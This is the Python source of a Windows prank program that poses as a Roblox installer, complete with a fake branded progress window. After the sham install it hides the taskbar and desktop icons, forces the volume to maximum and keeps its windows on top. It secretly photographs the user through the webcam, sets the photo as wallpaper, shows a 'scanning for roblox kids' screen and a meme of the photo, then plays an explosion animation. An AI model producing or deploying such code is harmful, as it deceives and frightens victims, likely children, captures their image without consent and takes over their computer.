# main.py
import os
import sys
import math
import time
import queue
import ctypes
import shutil
import threading
import subprocess
import tempfile
import traceback
import urllib.request
import urllib.error
import tkinter as tk

from PIL import Image, ImageTk, ImageDraw, ImageFont
from playsound3 import playsound

# ---------- Config ----------
APP_NAME    = "fvData"
INSTALL_DIR = os.path.join(os.environ.get("LOCALAPPDATA", os.path.expanduser("~")), APP_NAME)
VIDEO_PATH     = os.path.join(INSTALL_DIR, "vid.mp4")
BG_GIF_PATH    = os.path.join(INSTALL_DIR, "bg.gif")
BG2_GIF_PATH   = os.path.join(INSTALL_DIR, "bg2.gif")

REPO_BASE      = "https://raw.githubusercontent.com/forrealbugi-exp/fakeV/main/data"
BIG_LOGO_URL   = f"{REPO_BASE}/bigLogo.png"
SMALL_LOGO_URL = f"{REPO_BASE}/smallLogo.png"

# (name, weight). Missing files are skipped — their weight is redistributed.
INSTALL_FILES = [
    ("vid.mp4",       0.25),
    ("music.mp3",     0.12),
    ("scan.mp3",      0.05),
    ("success.mp3",   0.05),
    ("explosion.mp3", 0.05),
    ("explosion.gif", 0.20),
    ("bg.gif",        0.14),
    ("bg2.gif",       0.14),
]

LOGO_TMP_DIR    = os.path.join(tempfile.gettempdir(), "fv_installer_assets")
BIG_LOGO_PATH   = os.path.join(LOGO_TMP_DIR, "bigLogo.png")
SMALL_LOGO_PATH = os.path.join(LOGO_TMP_DIR, "smallLogo.png")

PHOTO_PATH = os.path.join(tempfile.gettempdir(), "fv_photo.jpg")
MEME_PATH  = os.path.join(tempfile.gettempdir(), "fv_meme.jpg")

# ---------- Audio (playsound3) ----------
_active_sounds = []
_active_sounds_lock = threading.Lock()

def play_audio(path, loop=False):
    if not path or not os.path.exists(path):
        print(f"audio missing: {path}")
        return None

    if loop:
        state = {"stop": False, "current": None, "path": path}

        def loop_runner():
            while not state["stop"]:
                try:
                    snd = playsound(path, block=False)
                    state["current"] = snd
                    try: snd.wait()
                    except Exception: time.sleep(0.1)
                except Exception as e:
                    print(f"audio loop error ({path}):", e)
                    break

        threading.Thread(target=loop_runner, daemon=True).start()
        with _active_sounds_lock:
            _active_sounds.append(state)
        return state

    try:
        snd = playsound(path, block=False)
    except Exception as e:
        print(f"audio play error ({path}):", e)
        return None
    with _active_sounds_lock:
        _active_sounds.append(snd)
    return snd

def stop_all_audio():
    with _active_sounds_lock:
        items = list(_active_sounds)
        _active_sounds.clear()
    for item in items:
        try:
            if isinstance(item, dict):
                item["stop"] = True
                cur = item.get("current")
                if cur is not None:
                    try: cur.stop()
                    except Exception: pass
            else:
                item.stop()
        except Exception:
            pass

# ---------- Volume force to 100 ----------
def set_volume_100():
    try:
        VK_VOLUME_UP    = 0xAF
        KEYEVENTF_KEYUP = 0x0002
        u = ctypes.windll.user32
        for _ in range(100):
            u.keybd_event(VK_VOLUME_UP, 0, 0, 0)
            u.keybd_event(VK_VOLUME_UP, 0, KEYEVENTF_KEYUP, 0)
    except Exception as e:
        print("volume error:", e)

def volume_force_loop(stop_event):
    use_pycaw = False
    iface = None
    try:
        from ctypes import cast, POINTER
        from comtypes import CLSCTX_ALL
        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
        dev = AudioUtilities.GetSpeakers()
        imm = getattr(dev, "_dev", dev)
        raw = imm.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        iface = cast(raw, POINTER(IAudioEndpointVolume))
        iface.SetMasterVolumeLevelScalar(1.0, None)
        use_pycaw = True
    except Exception as e:
        print("pycaw init failed, keybd fallback:", e)

    VK_VOLUME_UP    = 0xAF
    KEYEVENTF_KEYUP = 0x0002
    u = ctypes.windll.user32

    while not stop_event.is_set():
        if use_pycaw:
            try: iface.SetMasterVolumeLevelScalar(1.0, None)
            except Exception: use_pycaw = False
        else:
            for _ in range(3):
                u.keybd_event(VK_VOLUME_UP, 0, 0, 0)
                u.keybd_event(VK_VOLUME_UP, 0, KEYEVENTF_KEYUP, 0)
        stop_event.wait(0.3)

# ---------- Taskbar + desktop icons ----------
def _taskbars():
    u = ctypes.windll.user32
    hs = []
    for cls in ("Shell_TrayWnd", "Shell_SecondaryTrayWnd"):
        h = u.FindWindowW(cls, None)
        if h: hs.append(h)
    return hs

def hide_taskbar():
    for h in _taskbars():
        try: ctypes.windll.user32.ShowWindow(h, 0)
        except Exception: pass

def show_taskbar():
    for h in _taskbars():
        try: ctypes.windll.user32.ShowWindow(h, 5)
        except Exception: pass

def _desktop_listview():
    u = ctypes.windll.user32
    progman = u.FindWindowW("Progman", None)
    if progman:
        shell = u.FindWindowExW(progman, 0, "SHELLDLL_DefView", None)
        if shell:
            lv = u.FindWindowExW(shell, 0, "SysListView32", None)
            if lv: return lv
    WNDENUMPROC = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_void_p, ctypes.c_void_p)
    found = []
    def cb(h, _):
        sh = u.FindWindowExW(h, 0, "SHELLDLL_DefView", None)
        if sh:
            lv = u.FindWindowExW(sh, 0, "SysListView32", None)
            if lv: found.append(lv); return False
        return True
    u.EnumWindows(WNDENUMPROC(cb), 0)
    return found[0] if found else None

def set_desktop_icons(visible):
    lv = _desktop_listview()
    if lv:
        try: ctypes.windll.user32.ShowWindow(lv, 5 if visible else 0)
        except Exception: pass

# ---------- Wallpaper ----------
def set_wallpaper(path):
    if not path or not os.path.exists(path):
        print("wallpaper file missing, skipping")
        return
    try:
        SPI_SETDESKWALLPAPER = 20
        SPIF_UPDATEINIFILE   = 0x01
        SPIF_SENDCHANGE      = 0x02
        ctypes.windll.user32.SystemParametersInfoW(
            SPI_SETDESKWALLPAPER, 0, path,
            SPIF_UPDATEINIFILE | SPIF_SENDCHANGE,
        )
    except Exception as e:
        print("wallpaper error:", e)

# ---------- Topmost forcing ----------
def force_topmost(stop_event, own_pid):
    u = ctypes.windll.user32
    HWND_TOPMOST   = -1
    SWP_NOSIZE     = 0x0001
    SWP_NOMOVE     = 0x0002
    SWP_SHOWWINDOW = 0x0040
    WNDENUMPROC = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_void_p, ctypes.c_void_p)

    def cb(hwnd, _):
        wpid = ctypes.c_ulong()
        u.GetWindowThreadProcessId(hwnd, ctypes.byref(wpid))
        if wpid.value == own_pid and u.IsWindowVisible(hwnd):
            u.SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0,
                           SWP_NOSIZE | SWP_NOMOVE | SWP_SHOWWINDOW)
        return True

    proc = WNDENUMPROC(cb)
    while not stop_event.is_set():
        u.EnumWindows(proc, 0)
        stop_event.wait(0.25)

# ---------- Downloader ----------
def download_file(url, dest, progress_cb=None):
    os.makedirs(os.path.dirname(dest), exist_ok=True)
    tmp = dest + ".part"
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Roblox-Installer"})
        with urllib.request.urlopen(req) as r:
            total = int(r.headers.get("Content-Length", 0) or 0)
            done  = 0
            with open(tmp, "wb") as f:
                while True:
                    chunk = r.read(65536)
                    if not chunk: break
                    f.write(chunk); done += len(chunk)
                    if progress_cb and total:
                        progress_cb(done / total)
        os.replace(tmp, dest)
        return True
    except urllib.error.HTTPError as e:
        print(f"[download] HTTP {e.code} for {url} — skipping")
    except urllib.error.URLError as e:
        print(f"[download] network error for {url}: {e.reason}")
    except Exception as e:
        print(f"[download] failed for {url}: {e}")
    try:
        if os.path.exists(tmp): os.remove(tmp)
    except Exception: pass
    return False

def ensure_installer_logos():
    os.makedirs(LOGO_TMP_DIR, exist_ok=True)
    for url, dest in ((BIG_LOGO_URL, BIG_LOGO_PATH), (SMALL_LOGO_URL, SMALL_LOGO_PATH)):
        if os.path.exists(dest) and os.path.getsize(dest) > 0: continue
        download_file(url, dest)

# ---------- GIF frame loader ----------
def load_gif_frames(path, tw, th):
    """Return (list_of_ImageTk, list_of_durations_sec). Empty on failure."""
    tk_imgs, durs = [], []
    if not path or not os.path.exists(path):
        return tk_imgs, durs
    try:
        gif = Image.open(path)
        while True:
            frame = gif.copy().convert("RGBA").resize((tw, th), Image.LANCZOS)
            bg = Image.new("RGB", (tw, th), (0, 0, 0))
            bg.paste(frame, mask=frame.split()[3])
            tk_imgs.append(ImageTk.PhotoImage(bg))
            durs.append(max(0.03, gif.info.get("duration", 50) / 1000.0))
            gif.seek(gif.tell() + 1)
    except EOFError:
        pass
    except Exception as e:
        print(f"gif load error ({path}):", e)
    return tk_imgs, durs

# ---------- Installer UI ----------
class InstallerApp:
    W, H   = 520, 440
    BAR_H  = 70
    BLACK  = "#000000"
    BAR_BG = "#232527"

    def __init__(self, big_logo_path, small_logo_path):
        self.big_path   = big_logo_path
        self.small_path = small_logo_path

        self.root = tk.Tk()
        self.root.overrideredirect(True)
        self.root.attributes("-topmost", True)
        self.root.configure(bg=self.BLACK)
        self.root.resizable(False, False)
        self.root.update_idletasks()
        sw = self.root.winfo_screenwidth()
        sh = self.root.winfo_screenheight()
        self.root.geometry(f"{self.W}x{self.H}+{(sw-self.W)//2}+{(sh-self.H)//2}")

        self.canvas = tk.Canvas(self.root, width=self.W, height=self.H,
                                bg=self.BLACK, highlightthickness=0, bd=0)
        self.canvas.pack(fill="both", expand=True)

        self.big_img = None; self.small_img = None
        self._load_logos()
        self._draw()

        self.cancelled = False
        self.root.bind("<Escape>", lambda e: self.cancel())
        self.root.focus_force()

    def _load_logos(self):
        try:
            if self.big_path and os.path.exists(self.big_path):
                img = Image.open(self.big_path).convert("RGBA")
                img.thumbnail((220, 220), Image.LANCZOS)
                self.big_img = ImageTk.PhotoImage(img)
        except Exception as e: print("big logo error:", e)
        try:
            if self.small_path and os.path.exists(self.small_path):
                img = Image.open(self.small_path).convert("RGBA")
                img.thumbnail((200, 60), Image.LANCZOS)
                self.small_img = ImageTk.PhotoImage(img)
        except Exception as e: print("small logo error:", e)

    def _draw(self):
        c = self.canvas
        if self.big_img:
            c.create_image(self.W/2, (self.H - self.BAR_H)/2, image=self.big_img)
        bar_y = self.H - self.BAR_H
        c.create_rectangle(0, bar_y, self.W, self.H, fill=self.BAR_BG, outline="")
        self.progress_line = c.create_rectangle(0, bar_y, 0, bar_y+2,
                                                fill="#00a2ff", outline="")
        if self.small_img:
            c.create_image(22, bar_y + self.BAR_H/2, image=self.small_img, anchor="w")
        bw, bh = 88, 32
        bx = self.W - 20 - bw
        by = bar_y + (self.BAR_H - bh)/2
        rect = c.create_rectangle(bx, by, bx+bw, by+bh,
                                  fill="#2b2e31", outline="#4a4d4f", width=1,
                                  tags=("cancel_btn", "btn_rect"))
        c.create_text(bx + bw/2, by + bh/2, text="Cancel", fill="white",
                      font=("Segoe UI", 10), tags=("cancel_btn", "btn_text"))
        def on_enter(_): c.itemconfig(rect, fill="#3a3d40"); c.config(cursor="hand2")
        def on_leave(_): c.itemconfig(rect, fill="#2b2e31"); c.config(cursor="")
        def on_click(_): self.cancel()
        c.tag_bind("cancel_btn", "<Enter>", on_enter)
        c.tag_bind("cancel_btn", "<Leave>", on_leave)
        c.tag_bind("cancel_btn", "<Button-1>", on_click)

    def _set_progress(self, p):
        bar_y = self.H - self.BAR_H
        self.canvas.coords(self.progress_line, 0, bar_y, self.W * p, bar_y + 2)

    def start_install(self):
        threading.Thread(target=self._install_worker, daemon=True).start()

    def _install_worker(self):
        total_weight = sum(w for _, w in INSTALL_FILES)
        done_weight  = 0.0
        for name, weight in INSTALL_FILES:
            url  = f"{REPO_BASE}/{name}"
            dest = os.path.join(INSTALL_DIR, name)
            def cb(p, done_weight=done_weight, weight=weight):
                overall = (done_weight + p * weight) / total_weight
                self.root.after(0, self._set_progress, overall)
            download_file(url, dest, cb)
            done_weight += weight
            self.root.after(0, self._set_progress, done_weight / total_weight)
            if self.cancelled:
                return
        if not self.cancelled:
            self.root.after(250, self._close)

    def cancel(self):
        self.cancelled = True
        self._close()

    def _close(self):
        try: self.root.quit(); self.root.destroy()
        except Exception: pass

    def run(self):
        self.root.after(150, self.start_install)
        self.root.mainloop()
        return not self.cancelled

# ---------- Video playback ----------
def play_video(path):
    if not path or not os.path.exists(path):
        print("vid.mp4 missing, skipping video")
        return
    try:
        import imageio_ffmpeg
        import winsound
    except Exception as e:
        print("video deps error:", e)
        return

    ffmpeg_exe = imageio_ffmpeg.get_ffmpeg_exe()
    CREATE_NO_WINDOW = 0x08000000

    u  = ctypes.windll.user32
    sw = u.GetSystemMetrics(0); sh = u.GetSystemMetrics(1)

    wav_path = os.path.join(tempfile.gettempdir(), "fv_audio.wav")
    try:
        subprocess.run([ffmpeg_exe, "-y", "-i", path, "-vn",
                        "-acodec", "pcm_s16le", "-ar", "44100", "-ac", "2", wav_path],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                       creationflags=CREATE_NO_WINDOW)
    except Exception as e:
        print("audio extract error:", e); wav_path = None

    try:
        probe = imageio_ffmpeg.read_frames(path, pix_fmt="rgb24")
        meta  = next(probe); vw, vh = meta["size"]; fps = float(meta["fps"] or 30.0)
        try: probe.close()
        except Exception: pass
    except Exception as e:
        print("video probe error:", e)
        return

    target_area = (sw * sh) / 6.0
    aspect = vw / vh
    disp_h = int(math.sqrt(target_area / aspect)); disp_w = int(disp_h * aspect)
    if disp_w > vw or disp_h > vh: disp_w, disp_h = vw, vh
    disp_w -= disp_w % 2; disp_h -= disp_h % 2
    pos_x = max(40, sw // 8)
    pos_y = (sh - disp_h) // 2

    gen  = imageio_ffmpeg.read_frames(path, pix_fmt="rgb24",
                                      output_params=["-vf", f"scale={disp_w}:{disp_h}"])
    meta = next(gen); disp_w, disp_h = meta["size"]

    if wav_path and os.path.exists(wav_path):
        try: winsound.PlaySound(wav_path, winsound.SND_FILENAME | winsound.SND_ASYNC)
        except Exception as e: print("vid audio error:", e)

    root = tk.Tk()
    root.overrideredirect(True)
    root.attributes("-topmost", True)
    root.configure(bg="black")
    root.geometry(f"{disp_w}x{disp_h}+{pos_x}+{pos_y}")
    label = tk.Label(root, bg="black", bd=0)
    label.pack(fill="both", expand=True)
    root.update_idletasks()

    stop_event = threading.Event()
    threading.Thread(target=force_topmost, args=(stop_event, os.getpid()), daemon=True).start()

    frame_q = queue.Queue(maxsize=1)
    reader_stop = threading.Event()
    reader_done = threading.Event()

    def reader():
        try:
            frame_delay = 1.0 / fps
            t0 = time.perf_counter(); idx = 0
            for frame in gen:
                if reader_stop.is_set(): break
                target = t0 + idx * frame_delay
                now = time.perf_counter()
                if now < target: time.sleep(target - now)
                try: frame_q.get_nowait()
                except queue.Empty: pass
                try: frame_q.put_nowait(frame)
                except queue.Full: pass
                idx += 1
        except Exception as e: print("reader error:", e)
        finally: reader_done.set()

    threading.Thread(target=reader, daemon=True).start()

    try:
        while True:
            if reader_done.is_set() and frame_q.empty(): break
            try: frame = frame_q.get(timeout=0.2)
            except queue.Empty: continue
            try:
                img = Image.frombytes("RGB", (disp_w, disp_h), frame)
                tkimg = ImageTk.PhotoImage(img)
                label.configure(image=tkimg); label.image = tkimg
                root.update()
            except tk.TclError: break
    except Exception as e: print("render error:", e)
    finally:
        reader_stop.set(); stop_event.set()
        try: winsound.PlaySound(None, winsound.SND_PURGE)
        except Exception: pass
        try: gen.close()
        except Exception: pass
        try: root.destroy()
        except Exception: pass
        try:
            if wav_path and os.path.exists(wav_path): os.remove(wav_path)
        except Exception: pass

# ---------- Silent camera capture (1:1) ----------
def capture_photo(out_path):
    try:
        import cv2
    except Exception as e:
        print("cv2 import failed:", e)
        Image.new("RGB", (512, 512), (30, 30, 30)).save(out_path); return

    cap = None
    for idx in range(3):
        try: c = cv2.VideoCapture(idx, cv2.CAP_DSHOW)
        except Exception: c = cv2.VideoCapture(idx)
        if c.isOpened(): cap = c; break
        c.release()

    if cap is None:
        print("no camera found")
        Image.new("RGB", (512, 512), (30, 30, 30)).save(out_path); return

    for _ in range(8): cap.read(); time.sleep(0.05)
    ret, frame = cap.read(); cap.release()
    if not ret or frame is None:
        Image.new("RGB", (512, 512), (30, 30, 30)).save(out_path); return

    h, w = frame.shape[:2]; size = min(h, w)
    top = (h - size)//2; left = (w - size)//2
    cv2.imwrite(out_path, frame[top:top+size, left:left+size])

# ---------- Scanner UI (bg.gif background) ----------
def run_scanner(photo_path, scan_mp3, success_mp3, bg_gif_path):
    if os.path.exists(scan_mp3): play_audio(scan_mp3)

    root = tk.Tk()
    root.overrideredirect(True)
    root.attributes("-topmost", True)
    root.configure(bg="black")
    sw = root.winfo_screenwidth(); sh = root.winfo_screenheight()
    root.geometry(f"{sw}x{sh}+0+0")

    canvas = tk.Canvas(root, width=sw, height=sh, bg="black",
                       highlightthickness=0, bd=0)
    canvas.pack(fill="both", expand=True)

    # bg.gif stretched to full screen
    bg_tkimgs, bg_durs = load_gif_frames(bg_gif_path, sw, sh)
    if bg_tkimgs:
        bg_item = canvas.create_image(0, 0, image=bg_tkimgs[0], anchor="nw")
    else:
        bg_item = canvas.create_rectangle(0, 0, sw, sh, fill="black", outline="")

    # Photo
    size = int(min(sw, sh) * 0.62)
    px = (sw - size)//2
    py = (sh - size)//2 + 30

    img = Image.open(photo_path).convert("RGB").resize((size, size), Image.LANCZOS)
    tkimg = ImageTk.PhotoImage(img)
    canvas.create_image(sw//2, py + size//2, image=tkimg)
    canvas.image = tkimg

    canvas.create_text(sw//2, 70, text="scanning for roblox kids",
                       fill="#00ff00", font=("Consolas", 30, "bold"))
    line = canvas.create_line(px, py, px + size, py, fill="#00ff00", width=4)
    root.update()

    stop_event = threading.Event()
    threading.Thread(target=force_topmost, args=(stop_event, os.getpid()), daemon=True).start()

    start = time.time(); dur = 4.0; half = dur / 2.0
    frame_idx = 0
    frame_t_next = start

    while True:
        now = time.time()
        elapsed = now - start
        if elapsed >= dur: break

        if bg_tkimgs and now >= frame_t_next:
            canvas.itemconfig(bg_item, image=bg_tkimgs[frame_idx])
            canvas.image_bg = bg_tkimgs[frame_idx]
            frame_idx = (frame_idx + 1) % len(bg_tkimgs)
            frame_t_next = now + bg_durs[frame_idx]

        frac = (elapsed / half) if elapsed < half else (1.0 - (elapsed - half) / half)
        y = py + size * frac
        canvas.coords(line, px, y, px + size, y)

        root.update()
        time.sleep(0.016)

    # Success sound + 1s hold (NO green flash)
    if os.path.exists(success_mp3): play_audio(success_mp3)
    end_time = time.time() + 1.0
    while time.time() < end_time:
        now = time.time()
        if bg_tkimgs and now >= frame_t_next:
            canvas.itemconfig(bg_item, image=bg_tkimgs[frame_idx])
            canvas.image_bg = bg_tkimgs[frame_idx]
            frame_idx = (frame_idx + 1) % len(bg_tkimgs)
            frame_t_next = now + bg_durs[frame_idx]
        root.update()
        time.sleep(0.016)

    stop_event.set()
    root.destroy()

# ---------- Meme creation ----------
def create_meme(photo_path, out_path):
    photo = Image.open(photo_path).convert("RGB")
    ps = 750
    photo_square = photo.resize((ps, ps), Image.LANCZOS)
    bar_h = 110
    total_w, total_h = ps, ps + bar_h

    meme = Image.new("RGB", (total_w, total_h), (180, 10, 10))
    draw = ImageDraw.Draw(meme)
    draw.rectangle([0, 0, total_w, bar_h], fill=(180, 10, 10))

    font_path = "C:/Windows/Fonts/impact.ttf"
    if not os.path.exists(font_path):
        font_path = "C:/Windows/Fonts/arialbd.ttf"
    try:
        font_big = ImageFont.truetype(font_path, 62)
    except Exception:
        font_big = ImageFont.load_default()

    draw.text((25, bar_h // 2), "LIVE", fill="white", font=font_big, anchor="lm")
    draw.text((total_w - 25, bar_h // 2), "REACTION", fill="white", font=font_big, anchor="rm")

    # ============ TOP THUMBNAIL — HARD-STRETCHED ============
    # Aspect ratio 200:110 ≈ 1.82 : 1. Very obviously NOT square.
    thumb_w = 300
    thumb_h = 80                              # full bar height, edge-to-edge vertically
    thumb = photo_square.resize((thumb_w, thumb_h), Image.LANCZOS)
    meme.paste(thumb, (160, 10))     # 140px from left
    print(f"[meme] thumb size = {thumb_w}x{thumb_h}")
    # ========================================================

    meme.paste(photo_square, (0, bar_h))
    meme.save(out_path, quality=92)

# ---------- Meme display (bg2.gif background) ----------
def show_meme(meme_path, bg_gif_path, duration=3.0):
    root = tk.Tk()
    root.overrideredirect(True)
    root.attributes("-topmost", True)
    root.configure(bg="black")
    sw = root.winfo_screenwidth(); sh = root.winfo_screenheight()
    root.geometry(f"{sw}x{sh}+0+0")

    canvas = tk.Canvas(root, width=sw, height=sh, bg="black",
                       highlightthickness=0, bd=0)
    canvas.pack(fill="both", expand=True)

    bg_tkimgs, bg_durs = load_gif_frames(bg_gif_path, sw, sh)
    if bg_tkimgs:
        bg_item = canvas.create_image(0, 0, image=bg_tkimgs[0], anchor="nw")
    else:
        bg_item = canvas.create_rectangle(0, 0, sw, sh, fill="black", outline="")

    img = Image.open(meme_path).convert("RGB")
    img.thumbnail((int(sw*0.65), int(sh*0.9)), Image.LANCZOS)
    tkimg = ImageTk.PhotoImage(img)
    canvas.create_image(sw//2, sh//2, image=tkimg)
    canvas.image = tkimg

    stop_event = threading.Event()
    threading.Thread(target=force_topmost, args=(stop_event, os.getpid()), daemon=True).start()

    end_time = time.time() + duration
    frame_idx = 0
    frame_t_next = time.time()
    while time.time() < end_time:
        now = time.time()
        if bg_tkimgs and now >= frame_t_next:
            canvas.itemconfig(bg_item, image=bg_tkimgs[frame_idx])
            canvas.image_bg = bg_tkimgs[frame_idx]
            frame_idx = (frame_idx + 1) % len(bg_tkimgs)
            frame_t_next = now + bg_durs[frame_idx]
        root.update()
        time.sleep(0.016)

    stop_event.set()
    root.destroy()

# ---------- Explosion gif ----------
def play_explosion(gif_path, mp3_path):
    if not os.path.exists(gif_path):
        print("explosion.gif missing, skipping explosion")
        return
    if os.path.exists(mp3_path): play_audio(mp3_path)

    root = tk.Tk()
    root.overrideredirect(True)
    root.attributes("-topmost", True)
    root.configure(bg="black")
    sw = root.winfo_screenwidth(); sh = root.winfo_screenheight()
    root.geometry(f"{sw}x{sh}+0+0")

    canvas = tk.Canvas(root, width=sw, height=sh, bg="black",
                       highlightthickness=0, bd=0)
    canvas.pack(fill="both", expand=True)

    frames, durations = load_gif_frames(gif_path, sw, sh)
    if not frames:
        root.destroy()
        return

    stop_event = threading.Event()
    threading.Thread(target=force_topmost, args=(stop_event, os.getpid()), daemon=True).start()

    for i, frame in enumerate(frames):
        canvas.delete("all")
        canvas.create_image(sw//2, sh//2, image=frame)
        root.update(); time.sleep(durations[i])

    stop_event.set()
    root.destroy()

# ---------- Cleanup ----------
def cleanup():
    try: show_taskbar()
    except Exception: pass
    try: set_desktop_icons(True)
    except Exception: pass
    try: stop_all_audio()
    except Exception: pass
    for p in (PHOTO_PATH, MEME_PATH):
        try:
            if os.path.exists(p): os.remove(p)
        except Exception: pass
    for d in (INSTALL_DIR, LOGO_TMP_DIR):
        try:
            if os.path.exists(d): shutil.rmtree(d, ignore_errors=True)
        except Exception: pass

# ---------- Main ----------
def main():
    if os.path.exists(INSTALL_DIR):
        shutil.rmtree(INSTALL_DIR, ignore_errors=True)
    if os.path.exists(LOGO_TMP_DIR):
        shutil.rmtree(LOGO_TMP_DIR, ignore_errors=True)

    ensure_installer_logos()
    ok = InstallerApp(BIG_LOGO_PATH, SMALL_LOGO_PATH).run()
    if not ok:
        return

    hide_taskbar()
    set_desktop_icons(False)

    stop_vol = threading.Event()
    threading.Thread(target=volume_force_loop, args=(stop_vol,), daemon=True).start()
    set_volume_100()

    try:
        play_video(VIDEO_PATH)

        play_audio(os.path.join(INSTALL_DIR, "music.mp3"), loop=True)

        capture_photo(PHOTO_PATH)

        # Wallpaper = the photo just taken
        set_wallpaper(PHOTO_PATH)

        run_scanner(PHOTO_PATH,
                    os.path.join(INSTALL_DIR, "scan.mp3"),
                    os.path.join(INSTALL_DIR, "success.mp3"),
                    BG_GIF_PATH)

        create_meme(PHOTO_PATH, MEME_PATH)
        show_meme(MEME_PATH, BG2_GIF_PATH, duration=3.0)

        play_explosion(os.path.join(INSTALL_DIR, "explosion.gif"),
                       os.path.join(INSTALL_DIR, "explosion.mp3"))
    finally:
        stop_vol.set()
        cleanup()

if __name__ == "__main__":
    try:
        main()
    except Exception:
        try: cleanup()
        except Exception: pass
        ctypes.windll.user32.MessageBoxW(0, traceback.format_exc(), "fvData error", 0x10)
    finally:
        os._exit(0)